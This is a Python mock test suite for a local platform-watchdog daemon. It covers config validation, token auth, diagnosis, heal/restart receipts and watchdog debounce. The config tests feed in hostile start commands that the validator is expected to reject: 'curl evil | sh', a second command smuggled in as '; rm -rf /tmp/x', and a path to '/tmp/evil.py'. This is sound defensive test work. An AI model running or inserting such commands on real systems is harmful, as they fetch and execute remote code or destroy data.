#!/usr/bin/env python3
"""qianshu-copilotd 独立运行时 mock 测试。

运行：cd /opt/qianshu/backend && python3 tests/test_copilotd_mock.py
隔离性：全部在 tempfile 平台副本上进行——假千枢（stdlib http.server 脚本落
temp/backend/app/main.py，cmdline 带 app.main:app --port N 标记）由 start_cmd
真实拉起/终止；**绝不触碰真 8810 平台与 8000 邻居服务**。

验证项：
  A 配置白名单校验：shell 元字符/任意命令/非千枢目标/越界路径/远端 api_url/
    非本机监听/禁用端口 全拒绝；合法配置通过；缺配置自动首建 + token 0600
  B token 鉴权拒绝：无 token / 错 token 401；正确 token 200
  C 诊断分类：进程不在 / 端口被占（他人进程，且 stop 拒绝误杀）/ 进程在但 HTTP 不健康
    / 日志错误模式分类（Address already in use / Traceback / OOM）
  D 端点回执结构：/health /diagnose /heal /restart /status 字段与步骤链完整，
    heal 含最近变更可回滚提示；动作 jsonl 落盘完整动作链
  E 看门狗防抖：单次抖动不触发修复；连续 N 次才修复；退避期内不叠修
  F auto_heal 关=只报不动；平台恢复补报队列（宕机期积压、恢复后补报）
"""
import copy
import http.client
import json
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.copilotd import platform_ctl, procs  # noqa: E402
from app.copilotd.actions import ActionLog  # noqa: E402
from app.copilotd.bridge import BridgeClient, BridgeError, ReportQueue  # noqa: E402
from app.copilotd.checkup import run_checkup  # noqa: E402
from app.copilotd.config import (ConfigError, CopilotdConfig, ensure_token,  # noqa: E402
                                 load_or_create, resolve_bridge_token, validate)
from app.copilotd.diagnose import run_diagnose  # noqa: E402
from app.copilotd.healer import run_heal, run_restart  # noqa: E402
from app.copilotd.watchdog import Watchdog  # noqa: E402

TOKEN = "test-copilotd-token-0600"
BRIDGE_TOKEN = "test-bridge-token"
RESULTS = []
states = []   # 看门狗测试的脚本化体检序列（fake_checkup 消费）


def check(name, cond, detail=""):
    RESULTS.append((name, bool(cond)))
    print(("  ✓ " if cond else "  ✗ ") + name + (f"  [{detail}]" if detail and not cond else ""))


# ---------------- 假千枢平台（stdlib，独立进程，可被 start_cmd 真实拉起） ----------------
FAKE_PLATFORM_SRC = '''
import json, os, sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

REPORTS = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "reports.jsonl")
BRIDGE_TOKEN = "test-bridge-token"

def port_from_argv():
    args = sys.argv[1:]
    for i, a in enumerate(args):
        if a == "--port" and i + 1 < len(args):
            return int(args[i + 1])
    return 18999

class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass
    def _json(self, code, obj):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def do_GET(self):
        if self.path.startswith("/api/bootstrap/status"):
            self._json(200, {"initialized": True, "fake": True})
        elif self.path.startswith("/api/agent/lifecycle/recent"):
            if self.headers.get("X-Copilotd-Token") != BRIDGE_TOKEN:
                self._json(403, {"ok": False, "error": "bad token"})
                return
            self._json(200, {"ok": True, "pending_tickets": 1,
                             "change_tickets": [{"id": 1, "title": "mock 变更", "status": "pending"}],
                             "audit": [{"id": 1, "action": "agent.change.create", "result": "ok"}]})
        else:
            self._json(404, {"ok": False})
    def do_POST(self):
        if self.path.startswith("/api/agent/lifecycle/report"):
            if self.headers.get("X-Copilotd-Token") != BRIDGE_TOKEN:
                self._json(403, {"ok": False, "error": "bad token"})
                return
            n = int(self.headers.get("Content-Length") or 0)
            payload = json.loads(self.rfile.read(n) or b"{}")
            with open(REPORTS, "a") as f:
                f.write(json.dumps(payload, ensure_ascii=False) + "\\n")
            self._json(200, {"ok": True, "message_ids": [7], "audit": True})
        else:
            self._json(404, {"ok": False})

ThreadingHTTPServer(("127.0.0.1", port_from_argv()), H).serve_forever()
'''


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


class Env:
    """临时平台目录 + 配置 + 动作留痕。"""

    def __init__(self):
        self.dir = tempfile.mkdtemp(prefix="qianshu-copilotd-")
        self.port = free_port()
        os.makedirs(os.path.join(self.dir, "backend", "app"))
        with open(os.path.join(self.dir, "backend", "app", "main.py"), "w") as f:
            f.write(FAKE_PLATFORM_SRC)
        self.cfg = CopilotdConfig(
            platform_dir=self.dir,
            start_cmd=f"python3 {self.dir}/backend/app/main.py app.main:app --port {self.port}",
            api_url=f"http://127.0.0.1:{self.port}",
            health_path="/api/bootstrap/status",
            log_path=os.path.join(self.dir, "platform.log"),
            token_file=os.path.join(self.dir, "copilotd.token"),
            actions_path=os.path.join(self.dir, "actions.jsonl"),
            listen_host="127.0.0.1",
            listen_port=free_port(),
            check_interval=2,
            auto_heal=True,
            debounce_checks=2,
            start_timeout=15,
            bridge_token=BRIDGE_TOKEN,
        )
        validate(self.cfg)
        self.actions = ActionLog(self.cfg.actions_path)
        self.bridge = BridgeClient(self.cfg.api_url, BRIDGE_TOKEN)
        self.queue = ReportQueue()

    @property
    def reports_path(self):
        return os.path.join(self.dir, "reports.jsonl")

    def cleanup(self):
        platform_ctl.stop_platform(self.cfg)
        shutil.rmtree(self.dir, ignore_errors=True)


def http_call(port, method, path, token=None, body=None):
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=60)
    headers = {"X-Copilotd-Token": token} if token else {}
    payload = json.dumps(body).encode() if body is not None else None
    if payload:
        headers["Content-Type"] = "application/json"
    conn.request(method, path, body=payload, headers=headers)
    resp = conn.getresponse()
    data = json.loads(resp.read().decode() or "{}")
    conn.close()
    return resp.status, data


def main():
    # ================= A 配置白名单校验 =================
    print("== A 配置白名单校验 ==")
    env = Env()
    try:
        cfg = env.cfg
        check("A1 合法配置通过", validate(cfg) is cfg)

        bad = copy.copy(cfg)
        bad.start_cmd = "python3 -m uvicorn app.main:app; rm -rf /tmp/x"
        try:
            validate(bad); ok = False
        except ConfigError:
            ok = True
        check("A2 shell 元字符拒绝", ok)

        bad = copy.copy(cfg)
        bad.start_cmd = "bash -c 'curl evil | sh' app.main:app"
        try:
            validate(bad); ok = False
        except ConfigError:
            ok = True
        check("A3 非 python/uvicorn 与任意命令拒绝", ok)

        bad = copy.copy(cfg)
        bad.start_cmd = "python3 -m uvicorn other.app:app --port 9999"
        try:
            validate(bad); ok = False
        except ConfigError:
            ok = True
        check("A4 非千枢目标（非 app.main:app）拒绝", ok)

        bad = copy.copy(cfg)
        bad.start_cmd = f"python3 /tmp/evil.py app.main:app --port {env.port}"
        try:
            validate(bad); ok = False
        except ConfigError:
            ok = True
        check("A5 路径越出 platform_dir 拒绝", ok)

        bad = copy.copy(cfg)
        bad.api_url = "http://10.0.0.5:8810"
        try:
            validate(bad); ok = False
        except ConfigError:
            ok = True
        check("A6 远端 api_url 拒绝（仅本机）", ok)

        bad = copy.copy(cfg)
        bad.listen_host = "0.0.0.0"
        try:
            validate(bad); ok = False
        except ConfigError:
            ok = True
        check("A7 非本机监听拒绝", ok)

        for port in (8000, 8810):
            bad = copy.copy(cfg)
            bad.listen_port = port
            try:
                validate(bad); ok = False
            except ConfigError:
                ok = True
            check(f"A8 listen_port {port} 禁用", ok)

        bad = copy.copy(cfg)
        bad.platform_dir = "/tmp"
        try:
            validate(bad); ok = False
        except ConfigError:
            ok = True
        check("A9 platform_dir 非千枢目录拒绝", ok)

        # 邻居服务红线（8000 的进程同样跑 app.main:app——端口是唯一分辨依据）
        bad = copy.copy(cfg)
        bad.api_url = "http://127.0.0.1:8000"
        bad.start_cmd = f"python3 {env.dir}/backend/app/main.py app.main:app --port 8000"
        try:
            validate(bad); ok = False
        except ConfigError:
            ok = True
        check("A13 api_url 端口 8000（邻居服务）拒绝", ok)

        bad = copy.copy(cfg)
        bad.start_cmd = f"python3 {env.dir}/backend/app/main.py app.main:app --port 8000"
        try:
            validate(bad); ok = False
        except ConfigError:
            ok = True
        check("A14 start_cmd --port 与 api_url 不一致拒绝", ok)

        # 缺配置自动首建 + token 0600（token 落临时路径，不碰真实 /opt/qianshu/config）
        cfg_path = os.path.join(env.dir, "conf", "copilotd.json")
        loaded = load_or_create(cfg_path)
        check("A10 缺配置自动首建", os.path.isfile(cfg_path) and isinstance(loaded, CopilotdConfig))
        tmp_tok = os.path.join(env.dir, "auto.token")
        tok = ensure_token(tmp_tok)
        mode = os.stat(tmp_tok).st_mode & 0o777
        check("A11 token 文件 0600 且非空", mode == 0o600 and len(tok) >= 32, f"mode={oct(mode)}")
        check("A12 同 token 二次读取幂等", ensure_token(tmp_tok) == tok)
    finally:
        env.cleanup()

    # ================= B token 鉴权拒绝 =================
    print("== B token 鉴权拒绝 ==")
    from app.copilotd.server import Ctx, serve
    import threading

    env = Env()
    httpd = None
    try:
        with open(env.cfg.token_file, "w") as f:
            f.write(TOKEN + "\n")
        os.chmod(env.cfg.token_file, 0o600)
        ctx = Ctx(env.cfg, env.actions, env.bridge, env.queue)
        httpd = serve(ctx)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        lp = env.cfg.listen_port

        status, _ = http_call(lp, "GET", "/health")
        check("B1 无 token 401", status == 401, f"status={status}")
        status, _ = http_call(lp, "GET", "/health", token="wrong-token")
        check("B2 错 token 401", status == 401, f"status={status}")
        status, data = http_call(lp, "GET", "/health", token=TOKEN)
        check("B3 正确 token 200", status == 200 and data.get("ok") is True, f"status={status}")
        status, _ = http_call(lp, "POST", "/heal", token="wrong", body={})
        check("B4 写端点错 token 401", status == 401, f"status={status}")
        status, _ = http_call(lp, "GET", "/unknown", token=TOKEN)
        check("B5 未知端点 404", status == 404, f"status={status}")
    finally:
        if httpd:
            httpd.shutdown()
            httpd.server_close()
        env.cleanup()

    # ================= C 诊断分类 =================
    print("== C 诊断分类 ==")
    env = Env()
    try:
        # C1 进程不在 / 端口未听
        rep = run_checkup(env.cfg)
        check("C1 进程不在+端口未听", (not rep["healthy"]) and
              "process_missing" in rep["problems"] and "port_not_listening" in rep["problems"],
              str(rep["problems"]))
        dg = run_diagnose(env.cfg, bridge=env.bridge)
        check("C2 定位 verdict=platform_missing", dg["verdict"] == "platform_missing",
              dg["verdict"])

        # C3 端口被他人进程占用（裸 socket） + stop 拒绝误杀（安全红线）
        srv = socket.socket()
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("127.0.0.1", env.port))
        srv.listen(5)
        try:
            rep = run_checkup(env.cfg)
            check("C3 端口被占=port_occupied_foreign",
                  "port_occupied_foreign" in rep["problems"] and
                  rep["checks"]["port"]["occupant"] == "foreign", str(rep["problems"]))
            dg = run_diagnose(env.cfg)
            check("C4 定位 verdict=port_occupied_foreign", dg["verdict"] == "port_occupied_foreign",
                  dg["verdict"])
            stop = platform_ctl.stop_platform(env.cfg)
            check("C5 他人进程占端口：拒绝终止（不误杀）", stop["ok"] is False and
                  "拒绝终止" in stop["detail"], stop["detail"])
        finally:
            srv.close()

        # C6 进程在但 HTTP 不健康（健康路径打 404）
        proc = subprocess.Popen(
            [sys.executable, os.path.join(env.dir, "backend", "app", "main.py"),
             "app.main:app", "--port", str(env.port)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
        try:
            for _ in range(50):
                if procs.port_listener_pid(env.port):
                    break
                time.sleep(0.1)
            bad_cfg = copy.copy(env.cfg)
            bad_cfg.health_path = "/api/missing"
            rep = run_checkup(bad_cfg)
            check("C6 进程在+HTTP 不健康", rep["checks"]["process"]["ok"] and
                  "http_unhealthy" in rep["problems"] and
                  "process_missing" not in rep["problems"], str(rep["problems"]))
            check("C6b 进程在但不健康 → healthy=False", rep["healthy"] is False)

            # C7 健康态
            rep = run_checkup(env.cfg)
            check("C7 进程在+HTTP 200=healthy", rep["healthy"] is True, str(rep["problems"]))
        finally:
            platform_ctl.stop_platform(env.cfg)

        # C8 日志错误模式分类
        with open(env.cfg.log_path, "w") as f:
            f.write("INFO starting\nERROR Address already in use\n"
                    "Traceback (most recent call last):\n  boom\n"
                    "Out of memory: Killed process 123\n")
        lines = procs.tail_lines(env.cfg.log_path, 50)
        cls = procs.classify_log_errors(lines)
        check("C8 日志模式分类 OOM/Traceback/端口冲突",
              {"port_conflict", "oom", "traceback"} <= set(cls["patterns"]),
              str(cls["patterns"].keys()))

        # C9 bash 包装壳 cmdline 含 app.main:app 字样也不算千枢进程（防误杀回归）
        wrapper = subprocess.Popen(
            ["bash", "-c", "sleep 30", "app.main:app", "--port", str(env.port)],
            start_new_session=True)
        try:
            time.sleep(0.2)
            check("C9 bash 壳不算千枢进程（find=0）",
                  procs.find_platform_pid(env.port) == 0,
                  str(procs.find_platform_pid(env.port)))
            check("C9b bash 壳 is_platform_proc=False",
                  procs.is_platform_proc(wrapper.pid) is False)
        finally:
            wrapper.kill()
            wrapper.wait()

        # C10 运行期端口红线：指向 8000 的配置，start/stop 一律拒绝（第二道保险）
        evil = copy.copy(env.cfg)
        evil.api_url = "http://127.0.0.1:8000"
        stop = platform_ctl.stop_platform(evil)
        start = platform_ctl.start_platform(evil)
        check("C10 stop/start 指向 8000 一律拒绝",
              stop["ok"] is False and start["ok"] is False and "邻居服务" in stop["detail"],
              f"{stop} / {start}")
    finally:
        env.cleanup()

    # ================= D 端点回执结构（真 heal/restart 全链） =================
    print("== D 端点回执结构 ==")
    env = Env()
    httpd = None
    try:
        with open(env.cfg.token_file, "w") as f:
            f.write(TOKEN + "\n")
        os.chmod(env.cfg.token_file, 0o600)
        ctx = Ctx(env.cfg, env.actions, env.bridge, env.queue)
        httpd = serve(ctx)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        lp = env.cfg.listen_port

        # /health 回执结构
        status, data = http_call(lp, "GET", "/health", token=TOKEN)
        ok = (status == 200 and {"daemon", "platform"} <= set(data)
              and {"pid", "uptime_s", "auto_heal", "listen"} <= set(data["daemon"])
              and {"healthy", "process", "port", "http", "disk", "log_tail"} <= set(data["platform"]))
        check("D1 /health 回执结构", ok, str(data)[:200])

        # /diagnose 回执结构
        status, data = http_call(lp, "GET", "/diagnose", token=TOKEN)
        dg = data.get("diagnose", {})
        ok = (status == 200 and {"verdict", "checkup", "port_detail", "log_evidence",
                                 "recent_changes"} <= set(dg))
        check("D2 /diagnose 回执结构", ok, str(data)[:200])

        # POST /heal：平台当前没跑 → 诊断→（跳过变更）→拉起→验证→上报，步骤链完整
        t0 = time.time()
        status, data = http_call(lp, "POST", "/heal", token=TOKEN, body={"reason": "验收"})
        elapsed = time.time() - t0
        rec = data.get("receipt", {})
        step_names = [s["step"] for s in rec.get("steps", [])]
        ok = (status == 200 and rec.get("ok") is True
              and step_names == ["diagnose", "query_recent_changes", "stop_platform",
                                 "start_platform", "verify_health", "report"]
              and rec.get("action") == "heal" and rec.get("verify", {}).get("ok") is True)
        check("D3 /heal 回执步骤链完整", ok, f"steps={step_names} ok={rec.get('ok')}")
        check("D3b /heal 含 verdict_before", rec.get("verdict_before") in
              ("platform_missing", "http_unhealthy", "healthy"), str(rec.get("verdict_before")))

        # 拉起后平台真活着 + /diagnose 能查到最近变更（含可回滚提示）
        status, data = http_call(lp, "GET", "/diagnose", token=TOKEN)
        rc = data.get("diagnose", {}).get("recent_changes", {})
        check("D4 平台活着→最近变更快照+可回滚提示",
              rc.get("available") is True and "可回滚" in rc.get("rollback_hint", ""),
              str(rc)[:200])

        # /restart 回执结构
        status, data = http_call(lp, "POST", "/restart", token=TOKEN, body={})
        rec = data.get("receipt", {})
        step_names = [s["step"] for s in rec.get("steps", [])]
        ok = (status == 200 and rec.get("ok") is True
              and step_names == ["stop_platform", "start_platform", "verify_health", "report"]
              and rec.get("action") == "restart")
        check("D5 /restart 回执步骤链完整", ok, f"steps={step_names}")

        # 平台恢复事件真实写进假平台的 report 收口（审计桥收口，不发站内信）
        with open(env.reports_path) as f:
            reports = [json.loads(l) for l in f if l.strip()]
        actions = {r.get("action") for r in reports}
        check("D6 自愈事件经桥上报（审计收口）",
              {"copilotd.heal", "copilotd.restart"} <= actions, str(actions))

        # /status 回执 + jsonl 落盘完整动作链
        status, data = http_call(lp, "GET", "/status", token=TOKEN)
        acts = data.get("actions", [])
        ok = (status == 200 and {"total_actions", "actions", "pending_reports",
                                 "watchdog"} <= set(data) and len(acts) >= 2)
        check("D7 /status 回执结构", ok, str(data)[:200])
        with open(env.cfg.actions_path) as f:
            jsonl = [json.loads(l) for l in f if l.strip()]
        jsonl_actions = [r["action"] for r in jsonl]
        check("D8 jsonl 完整动作链（heal+restart 均落盘）",
              "heal" in jsonl_actions and "restart" in jsonl_actions, str(jsonl_actions))
        check("D8b jsonl 每条含步骤留痕",
              all(r.get("steps") for r in jsonl if r["action"] in ("heal", "restart")))

        # heal 幂等保护：进程已在跑时 start 不重复拉起
        start = platform_ctl.start_platform(env.cfg)
        check("D9 已运行不重复拉起", start["ok"] and start["already_running"] is True,
              str(start))
    finally:
        if httpd:
            httpd.shutdown()
            httpd.server_close()
        env.cleanup()

    # ================= E 看门狗防抖 / F auto_heal 关 + 补报 =================
    print("== E 看门狗防抖 / F auto_heal ==")
    env = Env()
    try:
        calls = {"heal": 0, "checks": []}

        def fake_checkup(cfg):
            state = states.pop(0) if states else "healthy"
            calls["checks"].append(state)
            return {"healthy": state == "healthy", "problems": [] if state == "healthy" else ["http_unhealthy"]}

        def fake_heal(cfg, action_log, bridge=None, queue=None, trigger=""):
            calls["heal"] += 1
            return {"ok": True, "action": "heal", "trigger": trigger}

        # E1 单次抖动不触发修复（防抖）
        states[:] = ["unhealthy", "healthy", "healthy"]
        clock = [0.0]
        wd = Watchdog(env.cfg, env.actions, env.bridge, env.queue,
                      checkup_fn=fake_checkup, heal_fn=fake_heal,
                      now_fn=lambda: clock[0])
        for _ in range(3):
            wd.run_once()
        check("E1 单次抖动不修复（防抖）", calls["heal"] == 0, str(calls))
        acts = [r["action"] for r in env.actions.recent()]
        check("E1b 抖动留痕 detect+recovered", "detect" in acts and "recovered" in acts, str(acts))

        # E2 连续 debounce 次才修复，退避期内不叠修
        calls["heal"] = 0
        env2 = Env()
        try:
            env2.cfg.debounce_checks = 2
            env2.cfg.heal_backoff_base = 100.0
            states[:] = ["unhealthy"] * 6
            clock[0] = 0.0
            wd = Watchdog(env2.cfg, env2.actions, env2.bridge, env2.queue,
                          checkup_fn=fake_checkup, heal_fn=fake_heal,
                          now_fn=lambda: clock[0])
            wd.run_once()                      # streak=1：防抖中
            check("E2 防抖：1 次不健康不修复", calls["heal"] == 0, str(calls))
            wd.run_once()                      # streak=2：触发修复
            check("E2b 连续 2 次触发修复", calls["heal"] == 1, str(calls))
            wd.run_once()                      # streak=3：退避期内不叠修
            check("E2c 退避期内不叠修", calls["heal"] == 1, str(calls))
            clock[0] = 200.0                   # 越过退避期
            wd.run_once()
            check("E2d 退避期过后允许再修", calls["heal"] == 2, str(calls))
        finally:
            env2.cleanup()

        # F1 auto_heal 关=只报不动
        calls["heal"] = 0
        env3 = Env()
        try:
            env3.cfg.auto_heal = False
            states[:] = ["unhealthy"] * 5
            clock[0] = 0.0
            wd = Watchdog(env3.cfg, env3.actions, env3.bridge, env3.queue,
                          checkup_fn=fake_checkup, heal_fn=fake_heal,
                          now_fn=lambda: clock[0])
            for _ in range(5):
                wd.run_once()
            check("F1 auto_heal 关=只报不动", calls["heal"] == 0, str(calls))
            acts = [r["action"] for r in env3.actions.recent()]
            check("F1b 异常有留痕（detect）且无 heal",
                  "detect" in acts and "heal" not in acts, str(acts))
        finally:
            env3.cleanup()

        # F2 补报队列：平台宕机积压 → 恢复后补报
        class FlakyBridge:
            def __init__(self):
                self.up = False
                self.received = []
            @property
            def enabled(self):
                return True
            def report(self, **kw):
                if not self.up:
                    raise BridgeError("platform down")
                self.received.append(kw)
                return {"ok": True}
        fb = FlakyBridge()
        q = ReportQueue()
        q.add(action="copilotd.heal", title="t1", content_md="c1")
        q.add(action="copilotd.recovered", title="t2", content_md="c2")
        r = q.flush(fb)
        check("F2 平台不可用→排队不丢", r["pending"] == 2 and len(fb.received) == 0, str(r))
        fb.up = True
        r = q.flush(fb)
        check("F2b 恢复后补报成功", r["sent"] == 2 and q.pending == 0 and len(fb.received) == 2,
              str(r))

        # F3 bridge token 从平台 .env 解析（单一事实源）
        env4 = Env()
        try:
            env4.cfg.bridge_token = ""
            os.makedirs(os.path.join(env4.cfg.resolved_workdir), exist_ok=True)
            with open(os.path.join(env4.cfg.resolved_workdir, ".env"), "w") as f:
                f.write("SECRET_KEY=x\nCOPILOTD_BRIDGE_TOKEN=env-token-123\n")
            check("F3 .env 的 COPILOTD_BRIDGE_TOKEN 可解析",
                  resolve_bridge_token(env4.cfg) == "env-token-123",
                  resolve_bridge_token(env4.cfg))
        finally:
            env4.cleanup()
    finally:
        env.cleanup()

    passed = sum(1 for _, ok in RESULTS if ok)
    print(f"\nmock 测试: {passed}/{len(RESULTS)} 通过")
    return 0 if passed == len(RESULTS) else 1


if __name__ == "__main__":
    raise SystemExit(main())
